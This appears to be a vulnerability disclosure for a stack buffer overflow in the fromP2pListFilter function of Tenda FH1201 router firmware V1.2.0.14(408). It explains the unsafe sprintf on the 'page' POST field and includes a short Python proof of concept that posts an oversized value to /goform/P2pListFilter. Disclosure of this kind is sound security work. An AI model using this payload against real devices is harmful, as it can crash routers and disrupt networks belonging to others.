## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3322.html

## Affected version

FH1201 Firmware  V1.2.0.14(408)

## Vulnerability details

The Tenda FH1201 Firmware  V1.2.0.14(408) has a stack overflow vulnerability located in the `fromP2pListFilter` function. This function accepts the `page` parameter from a POST request. The statement `sprintf(v11, "p2p.asp?page=%s", v8);` leads to a buffer overflow. The user-supplied `page` can exceed the capacity of the `v11` array, thus triggering this security vulnerability.

![image-20240731140850677](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240731140850677.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/P2pListFilter"
payload = b"a"*1000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240731133213595](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240731133213595.png)